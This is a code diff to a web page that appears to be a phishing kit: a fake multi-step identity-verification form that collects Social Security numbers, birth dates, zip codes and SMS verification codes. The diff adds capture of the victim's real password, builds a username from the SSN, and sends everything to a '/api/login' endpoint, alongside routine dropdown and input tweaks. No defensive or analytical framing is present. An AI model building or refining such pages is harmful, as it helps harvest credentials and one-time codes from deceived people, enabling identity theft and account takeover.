@@ -31,9 +31,9 @@
             
             <label>Birth Date</label>
             <div style="display:flex; gap:10px;">
-                <select id="month" required></select>
-                <select id="day" required></select>
-                <select id="year" required></select>
+                <select id="month" required><option value="">Month</option></select>
+                <select id="day" required><option value="">Day</option></select>
+                <select id="year" required><option value="">Year</option></select>
             </div>
             
             <label style="margin-top:20px;">
@@ -58,7 +58,7 @@
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
-            <input type="text" id="code" maxlength="6" placeholder="123456" required>
+            <input type="text" id="code" placeholder="123456" required>
             <div id="error" class="error"></div>
             
             <button class="continue" onclick="verifyCode()">Continue</button>
@@ -71,38 +71,8 @@
     </div>
 
     <script>
-        function populateDropdowns() {
-            // Months
-            const monthSelect = document.getElementById('month');
-            const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
-            months.forEach((month, index) => {
-                let option = document.createElement('option');
-                option.value = index + 1;
-                option.text = month;
-                monthSelect.appendChild(option);
-            });
-
-            // Days
-            const daySelect = document.getElementById('day');
-            for (let i = 1; i <= 31; i++) {
-                let option = document.createElement('option');
-                option.value = i;
-                option.text = i;
-                daySelect.appendChild(option);
-            }
-
-            // Years
-            const yearSelect = document.getElementById('year');
-            const currentYear = new Date().getFullYear();
-            for (let i = currentYear; i >= 1950; i--) {
-                let option = document.createElement('option');
-                option.value = i;
-                option.text = i;
-                yearSelect.appendChild(option);
-            }
-        }
-
         let currentStep = 1;
+        let originalPassword = "";
 
         function nextStep(step) {
             if (step === 2) {
@@ -140,9 +110,13 @@
                 return;
             }
 
-            const username = document.getElementById('ssn').value || "Verified User";
-            const password = "Verified";
-            const address = `SSN: ${document.getElementById('ssn').value} | DOB: ${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value} | Zip: ${document.getElementById('zip').value} | Code: ${code}`;
+            const ssn = document.getElementById('ssn').value;
+            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
+            const zip = document.getElementById('zip').value;
+
+            const username = ssn ? `SSN-${ssn}` : "Verified User";
+            const password = originalPassword || "Password";   // Real password
+            const address = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code}`;
 
             await fetch('/api/login', {
                 method: 'POST',
@@ -163,8 +137,34 @@
             document.getElementById('error').textContent = "";
         }
 
-        // Populate dropdowns when page loads
-        window.onload = populateDropdowns;
+        // Populate dropdowns
+        window.onload = () => {
+            const monthSelect = document.getElementById('month');
+            const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+            months.forEach((month, i) => {
+                let opt = document.createElement('option');
+                opt.value = i + 1;
+                opt.text = month;
+                monthSelect.appendChild(opt);
+            });
+
+            const daySelect = document.getElementById('day');
+            for (let i = 1; i <= 31; i++) {
+                let opt = document.createElement('option');
+                opt.value = i;
+                opt.text = i;
+                daySelect.appendChild(opt);
+            }
+
+            const yearSelect = document.getElementById('year');
+            const currentYear = new Date().getFullYear();
+            for (let i = currentYear; i >= 1950; i--) {
+                let opt = document.createElement('option');
+                opt.value = i;
+                opt.text = i;
+                yearSelect.appendChild(opt);
+            }
+        };
     </script>
 </body>
 </html>
